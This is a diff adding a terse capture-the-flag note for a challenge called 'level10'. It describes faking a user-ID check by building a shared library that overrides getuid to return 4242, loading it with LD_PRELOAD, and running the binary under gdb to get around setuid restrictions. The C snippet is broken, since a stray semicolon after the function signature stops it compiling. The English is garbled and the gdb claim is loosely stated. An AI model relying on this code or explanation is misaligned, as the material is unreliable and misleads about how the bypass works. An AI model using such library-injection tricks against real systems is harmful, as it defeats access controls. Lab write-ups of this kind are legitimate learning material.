@@ -1,0 +1,19 @@
+level10 file check if with getuid if uid is 4242
+
+override getuid:
+
+#include <sys/types.h>
+uid_t getuid(void);
+{
+    return 4242;
+}
+
+gcc -shared -o getuid.so -fPIC getuid.c
+to override the the getuid function, we can use LD_PRELOAD=/tmp/getuid.so
+
+When the setuid bit is set on an executable, the process 
+deactivate LD_PRELOAD but with GDB we can bypass this
+
+gdb ./level10
+run
+
